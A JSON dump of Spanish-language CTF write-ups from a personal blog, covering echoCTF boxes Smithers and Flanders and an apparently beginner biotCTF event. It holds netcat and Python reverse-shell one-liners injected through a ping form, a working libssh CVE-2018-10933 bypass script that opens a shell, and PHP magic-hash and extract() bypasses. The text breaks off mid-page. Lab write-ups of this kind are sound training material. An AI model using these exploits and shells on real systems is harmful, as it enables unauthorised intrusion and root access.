[{"content":"Estadísticas    Característica Descripción     Nombre smithers   Dificultad Beginner   Banderas 7 (5 other, env, root)   Puntos 8,100 pts (other/1,500 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, env/900 pts, root/1,500 pts)   Descripción / Pistas Like Smithers this server will serve you well only if you manage to enter it\u0026rsquo;s memcached store. The memcache service you just discovered on smithers.echocity-f.com/10.0.160.142:11211 has a hidden flag.    Reconocimiento Escaneo de host Escaneo completo de puertos ❯ nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 19:45 CDT Initiating Connect Scan at 19:45 Scanning 10.0.100.142 [65535 ports] Discovered open port 11211/tcp on 10.0.100.142 Discovered open port 10888/tcp on 10.0.100.142 Completed Connect Scan at 19:45, 21.90s elapsed (65535 total ports) Nmap scan report for 10.0.100.142 Host is up, received user-set (0.14s latency). Scanned at 2021-10-14 19:45:20 CDT for 22s Not shown: 53830 closed ports, 11703 filtered ports Reason: 53830 conn-refused and 11703 no-responses Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 10888/tcp open unknown syn-ack 11211/tcp open memcache syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 22.00 seconds Escaneo específico ❯ nmap -sCV -p 11211,10888 -oN nmap/targeted $BOX_TARGET Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 19:46 CDT Nmap scan report for 10.0.100.142 Host is up (0.14s latency). PORT STATE SERVICE VERSION 10888/tcp open http nginx |_http-title: Network Tools 11211/tcp open memcached Memcached 1.5.12 (uptime 36084 seconds) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds Enumeración Servicios http - 10888 Manual Al navegar al sitio se visualiza algún tipo de servicio que pone a disposición utilidades de red, pero de acuerdo con el mensaje que se arroja se puede suponer que para tener acceso se requiere estar en algún tipo de lista blanca que se encuentra configurada en el servidor. Tratando de hacer un bypass básico a esta validación se decidió jugar un poco con cabeceras como X-Forwarded-For entre otras, para ver si la respuesta por parte del servidor cambiaba de algún modo, sin éxito aparente.\nmemcached - 11211 Manual Siendo permitida la conexión directa mal socket mediante netcat se permite la obtención de datos existentes en el servidor mediante comandos propios de memcached, datos como versión, estatus, slabs, items, entre otros.\nComandos útiles\nDespués de entablar la conexión\nversion # Obtener versión stats # Obtener estatus stats slabs # Obtener slabs stats items # Obtener items de slabs con información stats cachedump \u0026lt;numero_de_item\u0026gt; 0 # Obtener nombres de llaves (0 es para no limitar el tamaño del output) get \u0026lt;nombre_de_item\u0026gt; # Obtener información guardada de item Referencia: https://book.hacktricks.xyz/pentesting/11211-memcache\nRecalcando que para la obtención del número de item se puede extraer de la columna señalada del output generado por la obtención de los items.\nExplotación Habiendo encontrado que se puede exfiltrar información mediante la interacción con el servicio de memcached faltaría validar si también se puede configurar información en el servicio.\nAbuso de escritura de items en memcached Pasos previos | Preparación Dentro de la enumeración se encontró que la versión de memcached y la información contenida al navegar al sitio expuesto coincidía por lo que bajo la suposición de que estos dos interactuan entre sí y de no haber encontrado el item REMOTE_ADDR como lo indica el sitio web se puede intentar guardando este item con el valor de la IP correspondiente.\nSintaxis\nset key flags exptime bytes value Uso\nset REMOTE_ADDR 0 2592000 4 test Referencia: https://www.tutorialspoint.com/memcached/memcached_set_data.htm\nAl tener problemas de interacción directa para configurar los valores se encontraron otras alternativas funcionales.\nMétodo 1 Comando\necho -e 'set REMOTE_ADDR 0 2592000 4\\r\\ntest\\r' | nc -nv -w 1 10.0.100.142 11211\n Ejecución. Validación de existencia (cuando antes no se desplegaba el item 1). Obtención de valor de valor.  Método 2 El paquete libmemcached-tools cuenta con utilidades para interactuar con conexiones de memcached. Haciendo uso de memccp se puede copiar un valor pasando como parámetro el archivo con el valor que se piensa ocupar y haciendo uso de memcat para la visualización de los valores de los items.\nsudo apt install libmemcached-tools echo -n \u0026#34;test2\u0026#34; \u0026gt; REMOTE_ADDR memccp --servers=10.0.100.142 REMOTE_ADDR memccat --servers=10.0.100.142 REMOTE_ADDR Referencia: https://www.hackingarticles.in/penetration-testing-on-memcached-server/\nEjecución Configurando la variable que concuerda con ambos servicios y añadiendo la asignada por la vpn el output de la página resulta diferente.\nA partir de este punto se puede observar que se habilita un formulario para realizar un ping a un host, lo que a nivel de código se puede reducir en algo como:\n$ip = \u0026#34;valor proporcionado por formulario\u0026#34; system(\u0026#39;ping \u0026#39; . $ip); Lo que al final se reduciría en ejecución remota de comandos, ya que en consola podemos usar \u0026ldquo;separadores\u0026rdquo; para ejecutar múltiples comandos en una misma instrucción, lo que a nivel de código se ejemplificaría en ping 127.0.0.1; whoami.\nAl ver el servicio lo ejecuta directamente root, al obtener una reverse shell, no se requiriría proceso de escalación de privilegios.\nAl realizar la prueba para obtener una reverse shell con netcat usando ;nc -e /bin/bash 10.10.0.26 1234 no se ejecutó satisfactoriamente por lo que se optó intentar con diferentes alcances, siendo python3 el funcional (;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.0.26\u0026quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026quot;sh\u0026quot;)').\nUbicación de banderas  Llave - valor de memcached. /var/lib/nginx/html/network-tools.php x 3. / Extrayendo las variables de entorno de los procesos en ejecución con strings /proc/*/environ | grep ETSCTF. /root.  ","permalink":"https://rzul.me/posts/echoctf_smithers/","summary":"Estadísticas    Característica Descripción     Nombre smithers   Dificultad Beginner   Banderas 7 (5 other, env, root)   Puntos 8,100 pts (other/1,500 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, env/900 pts, root/1,500 pts)   Descripción / Pistas Like Smithers this server will serve you well only if you manage to enter it\u0026rsquo;s memcached store. The memcache service you just discovered on smithers.","title":"echoCTF Smithers"},{"content":"Estadísticas    Característica Descripción     Nombre flanders   Dificultad Beginner   Banderas 4 (2 system, env, root)   Puntos 4,800 pts (system/1,000 pts, system/1,300 pts, env/900 pts, root/1,500 pts)   Descripción / Pistas Flanders simple and kind, always ready to to give a helping hand. His favorite catch phrase is Okily Dokily. Catch phrase sounds like a pass phrase, only without space    Reconocimiento Escaneo de host Escaneo completo de puertos ❯ sudo nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-27 09:35 CDT Initiating SYN Stealth Scan at 09:35 Scanning 10.0.100.34 [65535 ports] Discovered open port 6022/tcp on 10.0.100.34 Completed SYN Stealth Scan at 09:35, 14.77s elapsed (65535 total ports) Nmap scan report for 10.0.100.34 Host is up, received user-set (0.14s latency). Scanned at 2021-10-27 09:35:04 CDT for 15s Not shown: 65534 closed ports Reason: 65534 resets PORT STATE SERVICE REASON 6022/tcp open x11 syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.11 seconds Raw packets sent: 72729 (3.200MB) | Rcvd: 70809 (2.832MB) Escaneo específico ❯ nmap -sCV -p 6022 -oN nmap/targeted $BOX_TARGET Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-27 09:48 CDT Nmap scan report for 10.0.100.34 Host is up (0.14s latency). PORT STATE SERVICE VERSION 6022/tcp open ssh libssh 0.8.1 (protocol 2.0) | ssh-hostkey: |_ 2048 9c:42:2e:fa:60:30:95:dd:a0:60:80:1f:fd:ae:77:86 (RSA) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 4.85 seconds Enumeración Servicios (nombre - puerto) ssh - 6022 Manual Dado el reconocimiento por medio de nmap se puede identificar que se está corriendo un servidor ssh en un puerto no convencional y se expone la versión libssh 0.8.1, después de una búsqueda se puede identificar que la versión expuesta cuenta con una vulnerabilidad la cuál explota un bypass de autenticación, reportada en el CVE-2018-10933.\nSe encontraron diversos scripts en python que abusan de la vulnerabilidad:\n https://www.exploit-db.com/exploits/45638 https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d  Explotación libSSH Authentication Bypass Pasos previos | Preparación Como parte de los scripts buscados se encontró el siguiente código en un script que resultó bastante simple de ejecutar, únicamente realizando los cambios pertinentes de ip, puerto y comando (entablando una reverse shell).\nScript\n#!/usr/bin/python3 import sys import paramiko import socket s=socket.socket() s.connect((\u0026#34;10.0.100.34\u0026#34;,6022)) m=paramiko.message.Message() t=paramiko.transport.Transport(s) t.start_client() m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS) t._send_message(m) c=t.open_session(timeout=5) c.exec_command(\u0026#34;nc -e /bin/bash 10.10.0.26 1234\u0026#34;) out=c.makefile(\u0026#34;rb\u0026#34;,2048) output=out.read() out.close() print (output) Ejecución  Ejecución de script. Listener de reverse shell.  Post Explotación Enumeración Realizando enumeración manual se puede observar que el directorio principal del usuario al que se accede ETSCTF contiene una llave ssh que a primera impresión apuntaría a un método de escalación de privilegios a root.\n Directorio. Llave. Usuario al que pertenece.  Escalación de privilegios ETSCTF → root La idea inicial a seguir sería extraer la llave encontrada para intentar acceder al sistema con ella, dado que ningún intento funcionó, se puede tratar de ubicar si existe algún otro medio de acceso a la máquina por el cuál esté restringida a conexiones provenientes únicamente desde local, es decir, de flanders hacia flanders. Para comprobar esto se puede buscar si algún servicio de ssh está ejecutandose y si existe algún puerto que esté a la escucha de nuevas conexiones.\nLa salida del comando mapea automáticamente los puertos comúnes para el servicio siendo así que 127.0.0.1:ssh sería lo mismo que 127.0.0.1:22, verificando de esta manera que se escuchan conexiones ssh localmente.\nEn esta comprobación se puede ver que se está ejecutando sshd correspondiente al servidor de ssh en linux.\nSe suelen proteger las llaves ssh con passphrases y observando que en la descripción de la máquina se proporciona una passphrase (Okily Dokily) se pudiera concluir que al hacer uso de la llave se pedirá.\nLogrando así satisfactoriamente la escalación de privilegios.\nUbicación de banderas  /etc/passwd. /etc/shadow. Extrayendo las variables de entorno de los procesos en ejecución con strings /proc/*/environ | grep ETSCTF. /root.  ","permalink":"https://rzul.me/posts/echoctf_flanders/","summary":"Estadísticas    Característica Descripción     Nombre flanders   Dificultad Beginner   Banderas 4 (2 system, env, root)   Puntos 4,800 pts (system/1,000 pts, system/1,300 pts, env/900 pts, root/1,500 pts)   Descripción / Pistas Flanders simple and kind, always ready to to give a helping hand. His favorite catch phrase is Okily Dokily. Catch phrase sounds like a pass phrase, only without space    Reconocimiento Escaneo de host Escaneo completo de puertos ❯ sudo nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET Host discovery disabled (-Pn).","title":"echoCTF Flanders"},{"content":"Intro Dándole continuidad a las prácticas y CTFs en los que he participado, el pasado 19 de junio no fue la excepción. El nivel de dificultad, desde mi perspectiva, lo consideré amigable para los principiantes por lo que para quién se encuentra tratando de pulir habilidades fue un buen reto. Desafortunadamente no pude recopilar más información de sus creadores, más que la que está disponible en su página de twitter, un colega me puso al tanto de la info y decidimos tomar el reto.\nAgradecimientos Como ya lo mencioné antes, fue él quien me compartió la bases del CTF y pudimos participar en conjunto, no por el fin de buscar ganar si no de pasarla bien, aprender cosas nuevas y poner en práctica lo que llevamos estudiando. Muchas gracias por el tiempo dedicado en conjunto, saludos.\n D4rk》C0d3  Android Adivinar [500 pts] Descripción  No dejes que tus intentos se agoten\n adivina.apk\nPistas\nSolución La forma de resolver el reto pareciera no ser muy limpia o intencionada por el autor pero la forma como se resolvió fue haciendo reversing al apk dado, utilizando la herramienta apktool. Según la descripción dada por el sitio de la herramienta, permite la \u0026ldquo;decodificación\u0026rdquo; de los recursos del apk casi como los originales, por lo que al desempaquetarla y hacer una búsqueda del formato de banderas que ya se conoce entre los archivos resultantes se encontró la bandera.\nC:\\Users\\SrRequiem\\Desktop\u0026gt;apktool d adivina.apk I: Using Apktool 2.5.0 on adivina.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: C:\\Users\\SrRequiem\\AppData\\Local\\apktool\\framework\\1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... C:\\Users\\SrRequiem\\Desktop\\adivina\u0026gt;findstr /S \u0026#34;biotCTF{\u0026#34; * res\\values\\strings.xml: \u0026lt;string name=\u0026#34;Rflag\u0026#34;\u0026gt;biotCTF{4ndr01d_3s_d1v3rt1d0}\u0026lt;/string\u0026gt; Flag  biotCTF{4ndr01d_3s_d1v3rt1d0}\n Android J2 [200 pts] Descripción Gato.apk\nPistas\nSolución Al igual que el reto de adivina, se utilzó la herramienta apktool para realizar exactamente el mismo proceso, extracción/reversing de la apk y búsqueda de formato de bandera.\nC:\\Users\\SrRequiem\\Desktop\u0026gt;apktool d Gato.apk I: Using Apktool 2.5.0 on Gato.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: C:\\Users\\SrRequiem\\AppData\\Local\\apktool\\framework\\1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... C:\\Users\\SrRequiem\\Desktop\\Gato\u0026gt;findstr /S \u0026#34;biotCTF{\u0026#34; * smali\\biot\\ctf\\gato\\MainActivity$inicializarListeners$2.smali: const-string v0, \u0026#34;El jugador 2 gano! biotCTF{4ndr01d_j2_kl0t1n}\u0026#34; Flag  biotCTF{4ndr01d_j2_kl0t1n}\n Crypto Json Walter Tarantino [100 pts] Descripción  Json quiere trabajar en Biot, pero para aprobar, necesita romper el siguiente hash ¡ayuda a json a conseguir un empleo! eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmbGFnIjoiYmlvdENURntqczBuX3czYl9UMGszbl9iMTB0fSIsInVzZXIiOiJOM3VUcjBuIiwiZXhwIjoyMDA1MDMzNDkzfQ.jGtv9gJt5qKvTyHLFTM3kWNz8A88Qb0V3FS9HwTNNy0\n Pistas\nSolución Por la pista del nombre del reto y el formato dado del \u0026ldquo;hash\u0026rdquo; se puede concluir que la cadena dada es un Json Web Token (JWT) por lo que al copiar y pegar la cadena en https://jwt.io/ nos muestra la información decodificada, mostrando así la bandera.\nFlag  biotCTF{js0n_w3b_T0k3n_b10t}\n Forense Escáner Código de Barra [300 pts] Descripción  Hay algo raro en mi teléfono, no reconoce este código de barras. ¿Puedes intentarlo?.\n Pistas\nSolución Realizando un análisis de la imagen dada se puede ver que los bordes del código de barras dado, termina en blanco lo cuál es raro dado que eso no se ve comúnmente, inicialmente se trató de de recortar la imagen para eliminar esos \u0026ldquo;bordes\u0026rdquo; sin éxito alguno, por lo que posteriormente se intentó a realizar una inversión de colores de la imagen original utilizando esta herramienta online.\nImagen generada\nPara después decodificar el código de barras generado, subiendo la imagen a decodificar en esta herramienta. Obteniendo así la bandera.\nFlag  biotCTF{c0d1g0_1nv3rt1d0_b10t}\n Usuario John64 [100 pts] Descripción  ayudemos a Jonh a recuperar la flag oculta.\n john.txt\nPistas\nSolución Inicialmente se puede observar que el contenido del archivo es una cadena en base64, la cuál, al decodificarla se pueden ver carácteres no imprimibles e imprimibles por lo que se puede concluir que el contenido es un archivo, al hacer el pipe correspondiente se observa que es un archivo de tipo rar protegido con contraseña siendo que dentro de este se pueden ver los nombres de los archivos que contiene. Por lo que el paso siguiente a partir de este punto es realizar tarea de cracking del archivo para poder extraer sus contenidos.\n┌──(kali㉿kali)-[~/Desktop] └─$ cat john.txt | base64 -d Rar!▒3��� ����cU\u0026lt;�� ���flag.txt0�_\u0026#34;��\u0026lt;��c�B`m?�y��ETX���9Af!���Ci�3��R�f�� ���/�a�)�H-�U�▒���y�WKsr�#��} �AƂn�����T��l8�wVQ ┌──(kali㉿kali)-[~/Desktop] └─$cat john.txt | base64 -d \u0026gt; john.file ┌──(kali㉿kali)-[~/Desktop] └─$file john.file john.file: RAR archive data, v5 ┌──(kali㉿kali)-[~/Desktop] └─$strings john.file Rar! flag.txt0 B`m? 9Af! WKsr Flag  biotCTF{jh0n_th3_b10t}\n Visión túnel Biot [200 pts] Descripción  Encontramos estos archivos. Recupera la bandera.\n Pistas\nSolución Flag  biotCTF{f0rm4t0_bmp_b10t}\n OSINT Twitter [150 pts] Descripción  Ya est\\xc3\\xa1n abiertos los registros para BIOTCTF.\\r\\nme gusta mucho esa imagen.\n Pistas\n       Solución Flag Redes Ess id concatenado [200 pts] Descripción   Pistas\n       Solución Flag Hiper [100 pts] Descripción   Pistas\n       Solución Flag Stego Spectro [100 pts] Descripción   Pistas\n       Solución Flag Web A romper el Hash [100 pts] Descripción  ¿Te gusta la caza de recompensas? ¡A mi también! Encontré este inicio de sesión interno de BiOt. Este es un inicio de sesión solo con contraseña, ¿puedes descifrar el pase?. http://3.135.19.159/crack/index.php\n Pistas\n http://3.135.19.159/crack/index.php?codigo_fuente  index.php?codigo_fuente\n\u0026lt;?php if (isset($_GET[\u0026#39;codigo_fuente\u0026#39;])) { die(highlight_file(__FILE__)); } ?\u0026gt;\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;title\u0026gt;Crack the Password\u0026lt;/title\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; integrity=\u0026#34;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;style\u0026gt; .corb-body { background-color: #0fbcf9;} .centered { position: fixed; top: 50%; left: 50%; /* bring your own prefixes */ transform: translate(-50%, -50%); } .corb-login-length { width: 200px;} .corb-submit { position: relative; left: auto; right: -120px;} .corb-flag { color: #ffffff; } .corb-alert { margin-top: 20px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;corb-body container-fluid\u0026#34;\u0026gt; \u0026lt;?php include \u0026#34;flag.php\u0026#34;; if($_POST[\u0026#34;password\u0026#34;]){ $password = $_POST[\u0026#34;password\u0026#34;]; if(md5($password) == \u0026#34;5e9f9f8023e802fa095df77507ab5ad6\u0026#34;){ echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-success centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; Flag: \u0026#39;.$flag.\u0026#39; \u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); }else{ echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;Sorry, Wrong password!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } die; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;well\u0026#34;\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h3 class=\u0026#34;corb-login-length\u0026#34;\u0026gt;Password login\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;button class=\u0026#34;corb-submit btn btn-primary btn-lg\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.1.1.min.js\u0026#34; integrity=\u0026#34;sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- see ?debug for source--\u0026gt; \u0026lt;/html\u0026gt; Solución Flag  biotCTF{h4sh_d3c1fr4d0_b10t}\n Bypass como un 1337 [300 pts] Descripción  Estoy empezando a creer que ya no existe un verdadero 1337, ¿lo vales o no? Prueba tu mismo. http://3.135.19.159/bypass/index.php\n Pistas\n http://3.135.19.159/bypass/index.php?codigo_fuente  index.php?codigo_fuente\nCódigo pendiente\nSolución El camino a la explotación era por medio de una mala implementación de la función extract() de PHP, la cuál permite la modificación de las variables declaradas con anterioridad. Por lo que al modificar una variable designada, se podía hacer bypass de una validación que el código hacía. Se utilizó este artículo para obtener la bandera, el cuál explica más a detalle la vulnerabilidad.\nFlag  biotCTF{byp4ss_b10t_1337_s1}\n Magia [200 pts] Descripción  ¿¡Que tipo de magia es esto!?, yo si creo en la magia ¿y tú?. http://3.135.19.159/magic/index.php\n Pistas\n http://3.135.19.159/magic/index.php?codigo_fuente  index.php?codigo_fuente\n\u0026lt;?php if (isset($_GET[\u0026#39;codigo_fuente\u0026#39;])) { die(highlight_file(__FILE__)); } ?\u0026gt;\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;title\u0026gt;Magic Password\u0026lt;/title\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; integrity=\u0026#34;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;style\u0026gt; .corb-body { background-color: #B53471;} .centered { position: fixed; top: 50%; left: 50%; /* bring your own prefixes */ transform: translate(-50%, -50%); } .corb-login-length { width: 200px;} .corb-submit { position: relative; left: auto; right: -120px;} .corb-flag { color: #ffffff; } .corb-alert { margin-top: 20px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;corb-body container-fluid\u0026#34;\u0026gt; \u0026lt;?php include \u0026#39;flag.php\u0026#39;; if($_POST[\u0026#34;password\u0026#34;]) { $md5 = \u0026#34;240610708\u0026#34;; if ($_POST[\u0026#34;password\u0026#34;] != $md5 and hash(\u0026#34;md5\u0026#34;,$_POST[\u0026#34;password\u0026#34;]) == hash(\u0026#34;md5\u0026#34;, $md5)) { echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-success centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; Flag: \u0026#39;.$flag.\u0026#39; \u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } else { echo (\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;Sorry, Wrong password!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } die(); } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;well\u0026#34;\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h3 class=\u0026#34;corb-login-length\u0026#34;\u0026gt;Password login\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;button class=\u0026#34;corb-submit btn btn-primary btn-lg\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.1.1.min.js\u0026#34; integrity=\u0026#34;sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- see ?debug for source--\u0026gt; \u0026lt;/html\u0026gt; Solución Se puede ver que el login recibirá por medio de POST el parámetro password y posteriormente hará una validación del valor que se le pase comparándose con la cadena 240610708 y el valor de los hashes md5 dados por php. Por lo que se necesita hacer un bypass de esta validación. Dado el nombre del reto nos puede sonar una mala implementación de código en los sistemas de autenticación hechos en php, llamada Magic Hashes por lo que una búsqueda de esto fácilmente nos puede dar la respuesta al reto. En este artículo, se da un ejemplo del bypass con los magic hashes justamente con el valor que se está usando en el reto, por lo que la cadena QNKCDZO en el parámetro del campo password nos daría la bandera.\nFlag  biotCTF{m4g14_b10t_s1}\n Numeros de la suerte [300 pts] Descripción  ¡Llevemos tu suerte al límite, adivina el número correcto y obtendrás el premio!. http://3.135.19.159/numeric/index.php\n Pistas\n http://3.135.19.159/numeric/index.php?codigo_fuente  index.php?codigo_fuente\n\u0026lt;?php if (isset($_GET[\u0026#39;codigo_fuente\u0026#39;])) { die(highlight_file(__FILE__)); } ?\u0026gt;\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;title\u0026gt;Lucky numbers\u0026lt;/title\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; integrity=\u0026#34;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;style\u0026gt; .corb-body { background-color: #2d98da;} .centered { position: fixed; top: 50%; left: 50%; /* bring your own prefixes */ transform: translate(-50%, -50%); } .corb-login-length { width: 200px;} .corb-submit { position: relative; left: auto; right: -120px;} .corb-flag { color: #ffffff; } .corb-alert { margin-top: 20px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;corb-body container-fluid\u0026#34;\u0026gt; \u0026lt;?php require \u0026#39;flag.php\u0026#39;; $angka = $_GET[\u0026#39;number\u0026#39;]; if (isset($angka)) { if (is_numeric($angka)){ if (!strpos($angka, \u0026#34;.\u0026#34;)){ if (strlen($angka) \u0026gt; 6){ if ($angka \u0026lt; 99999 \u0026amp;\u0026amp; $angka \u0026gt; 90000) echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-success centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; Flag: \u0026#39;.$flag.\u0026#39; \u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); else echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;Demasiado largo!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } else echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;Demasiado corto!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } else echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;no uses puntos!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); } else echo(\u0026#39;\u0026lt;h1\u0026gt;\u0026lt;div class=\u0026#34;alert alert-danger centered\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;deben ser numeros!\u0026lt;/div\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;); die; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;centered\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;well\u0026#34;\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h3 class=\u0026#34;corb-login-length\u0026#34;\u0026gt;Gacha is our life\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;input 